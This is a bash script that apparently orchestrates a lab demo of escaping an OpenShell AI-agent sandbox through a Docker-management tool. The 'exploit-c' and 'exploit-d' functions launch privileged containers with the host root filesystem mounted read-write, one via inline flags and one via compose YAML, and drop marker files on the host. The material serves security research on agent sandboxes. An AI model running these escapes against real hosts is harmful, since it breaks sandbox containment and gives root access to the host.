#!/bin/bash
# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Orchestrates the docker-privesc demo's persistent services and the sandbox itself.
# This script does NOT replace watching it happen live across terminals — it exists
# so standing the stack up (or tearing it down) is one command instead of the manual
# steps in README.md's "Reproducing this" section, which remains the authoritative
# reference if this script and reality ever disagree.
#
# Usage:
#   ./run.sh up            # start docker-manager-mcp, Dynamo/Qwen, roundhouse (idempotent)
#   ./run.sh sandbox       # create/attach the OpenShell sandbox (idempotent)
#   ./run.sh negative      # run Path A negative control (step 7)
#   ./run.sh exploit-c     # run Path C exploit — inline privileged flag (step 8)
#   ./run.sh exploit-d     # run Path D exploit — compose YAML via stdin (step 9)
#   ./run.sh verify        # verify both host markers exist (step 10)
#   ./run.sh status        # print status of every component
#   ./run.sh down          # tear down sandbox + roundhouse + Dynamo + docker-manager-mcp

set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${HERE}/../.." && pwd)"
DOCKER_PRIVESC_LAB="${DOCKER_PRIVESC_LAB:-${REPO_ROOT}/labs/docker-privesc-lab}"
DYNAMO_CLONE="${DYNAMO_CLONE:-/home/ubuntu/dynamo}"
ROUNDHOUSE_BIN="${ROUNDHOUSE_BIN:-${REPO_ROOT}/target/release/roundhouse}"
SANDBOX_NAME="${SANDBOX_NAME:-docker-privesc-demo}"
LOCAL_MODEL="${LOCAL_MODEL:-Qwen/Qwen2.5-7B-Instruct}"

turn_key() {
  python3 -c "import json,sys; print(json.load(open('${HERE}/keys.local.json'))['$1'])"
}

cmd_up() {
  echo "[*] docker-manager-mcp (docker-privesc-lab, outside the sandbox)"
  ( cd "${DOCKER_PRIVESC_LAB}" && docker compose -f docker-compose.docker-manager-mcp.yml up -d --build )

  echo "[*] Dynamo/Qwen local worker"
  if ! curl -sf -o /dev/null http://127.0.0.1:8000/v1/models; then
    if ! docker start dev-etcd-server-1 dev-nats-server-1 >/dev/null 2>&1; then
      ( cd "${DYNAMO_CLONE}" && docker compose -f dev/docker-compose.yml up -d )
      sleep 3
    fi
    ( source "${DYNAMO_CLONE}/.venv/bin/activate" && \
      cd "${HERE}/../cache-aware-routing" && \
      MODEL="${LOCAL_MODEL}" nohup bash ./serve_model.sh serve > /tmp/docker-privesc-dynamo.log 2>&1 & )
    echo "    started in background, log: /tmp/docker-privesc-dynamo.log (takes ~30-60s to come up)"
  else
    echo "    already serving on :8000"
  fi

  echo "[*] roundhouse (both legs)"
  if ! curl -sf -o /dev/null http://127.0.0.1:8080/v1/metrics -H "x-roundhouse-key: $(turn_key __admin__)"; then
    TOKENIZER_DIR="$(find ~/.cache/huggingface/hub -maxdepth 1 -iname "models--${LOCAL_MODEL//\//--}" 2>/dev/null | head -1)"
    TOKENIZER="$(find "${TOKENIZER_DIR}" -iname tokenizer.json 2>/dev/null | head -1)"
    INFERENCE_API_KEY="$(grep INFERENCE_API_KEY "${DOCKER_PRIVESC_LAB}/../breakout-lab/.env" 2>/dev/null | cut -d= -f2 || echo '')" \
    ROUNDHOUSE_CATALOG="${HERE}/catalog.json" \
    ROUNDHOUSE_CONTROL_PLANE="${HERE}/control-plane.json" \
    ROUNDHOUSE_ADDR=0.0.0.0:8080 \
    ROUNDHOUSE_FRONTIER_UPSTREAM=openai_responses \
    ROUNDHOUSE_LOCAL_ENDPOINT=http://127.0.0.1:8000 \
    ROUNDHOUSE_LOCAL_MODEL="${LOCAL_MODEL}" \
    ROUNDHOUSE_LOCAL_TOKENIZER="${TOKENIZER}" \
    ROUNDHOUSE_LOCAL_KV_EVENTS_ENDPOINT=tcp://127.0.0.1:20080 \
    nohup "${ROUNDHOUSE_BIN}" > /tmp/docker-privesc-roundhouse.log 2>&1 &
    echo "    started in background, log: /tmp/docker-privesc-roundhouse.log"
  else
    echo "    already listening on :8080"
  fi
}

cmd_sandbox() {
  if openshell sandbox list 2>/dev/null | grep -q "^${SANDBOX_NAME}\b"; then
    echo "[*] sandbox ${SANDBOX_NAME} already exists"
    return
  fi
  openshell provider profile import -f "${HERE}/openshell-roundhouse-provider.yaml" --global 2>/dev/null || \
    openshell provider profile update roundhouse -f "${HERE}/openshell-roundhouse-provider.yaml" --global
  openshell provider create --name roundhouse --type roundhouse \
    --credential "ANTHROPIC_API_KEY=rh_sentinel_not_a_credential" 2>/dev/null || true
  TURN_KEY="$(turn_key docker-privesc-frontier/openclaw-frontier)"
  openshell sandbox create --name "${SANDBOX_NAME}" \
    --from ghcr.io/nvidia/openshell-community/sandboxes/base:latest \
    --provider roundhouse \
    --policy "${HERE}/openshell-sandbox-policy.yaml" \
    --env "ANTHROPIC_BASE_URL=http://host.openshell.internal:8080" \
    --env "ANTHROPIC_CUSTOM_HEADERS=x-roundhouse-key: ${TURN_KEY}" \
    --no-credential-warnings --detach
  echo "[*] installing docker-manage skill + fastmcp"
  openshell sandbox upload "${SANDBOX_NAME}" \
    "${DOCKER_PRIVESC_LAB}/openshell/skills/docker-manage" /sandbox/.claude/skills/docker-manage
  openshell sandbox exec -n "${SANDBOX_NAME}" -- /sandbox/.venv/bin/python3 -m pip install -q fastmcp
}

cmd_negative() {
  echo "[*] Step 7 — Path A negative control (expect: [POLICY] Rejected)"
  openshell sandbox exec -n "${SANDBOX_NAME}" \
    --workdir /sandbox/.claude/skills/docker-manage/docker-manage -- \
    python3 manage.py --tool run_named_compose --name dev-environment || true
}

cmd_exploit_c() {
  echo "[*] Step 8 — Path C exploit — inline privileged flag, no file write"
  openshell sandbox exec -n "${SANDBOX_NAME}" \
    --workdir /sandbox/.claude/skills/docker-manage/docker-manage -- \
    python3 manage.py --tool run_container \
      --image alpine \
      --command "touch /host/tmp/DOCKER_PRIVESC_MARKER_path_c" \
      --privileged \
      --volumes '{"/" : {"bind": "/host", "mode": "rw"}}' || true
}

cmd_exploit_d() {
  echo "[*] Step 9 — Path D exploit — compose YAML piped via stdin"
  openshell sandbox exec -n "${SANDBOX_NAME}" \
    --workdir /sandbox/.claude/skills/docker-manage/docker-manage -- \
    python3 manage.py --tool apply_compose --yaml "
version: '3'
services:
  privesc:
    image: alpine
    privileged: true
    volumes:
      - /:/host
    command: touch /host/tmp/DOCKER_PRIVESC_MARKER_path_d
" || true
}

cmd_verify() {
  echo "[*] Step 10 — Verify host markers"
  ls /tmp/DOCKER_PRIVESC_MARKER_* 2>&1 || echo "  (no markers found — exploit did not succeed)"
}

cmd_status() {
  echo "=== docker-manager-mcp ===" ; docker ps --format '{{.Names}}\t{{.Status}}' | grep docker-manager-mcp || echo "not running"
  echo "=== Dynamo/Qwen ===" ; curl -sf -o /dev/null -w "http %{http_code}\n" http://127.0.0.1:8000/v1/models || echo "not running"
  echo "=== roundhouse ===" ; curl -sf -o /dev/null -w "http %{http_code}\n" http://127.0.0.1:8080/v1/metrics -H "x-roundhouse-key: $(turn_key __admin__)" 2>/dev/null || echo "not running"
  echo "=== OpenShell sandbox ===" ; openshell sandbox list 2>&1
  echo "=== host markers ===" ; ls /tmp/DOCKER_PRIVESC_MARKER_* 2>/dev/null || echo "  (none)"
}

cmd_down() {
  openshell sandbox delete "${SANDBOX_NAME}" 2>&1 || true
  pkill -f "target/release/roundhouse" 2>&1 || true
  pkill -f "dynamo.vllm\|dynamo.frontend" 2>&1 || true
  ( cd "${DOCKER_PRIVESC_LAB}" && docker compose -f docker-compose.docker-manager-mcp.yml down ) || true
}

case "${1:-status}" in
  up)        cmd_up ;;
  sandbox)   cmd_sandbox ;;
  negative)  cmd_negative ;;
  exploit-c) cmd_exploit_c ;;
  exploit-d) cmd_exploit_d ;;
  verify)    cmd_verify ;;
  status)    cmd_status ;;
  down)      cmd_down ;;
  *)         echo "usage: $0 {up|sandbox|negative|exploit-c|exploit-d|verify|status|down}" >&2; exit 2 ;;
esac
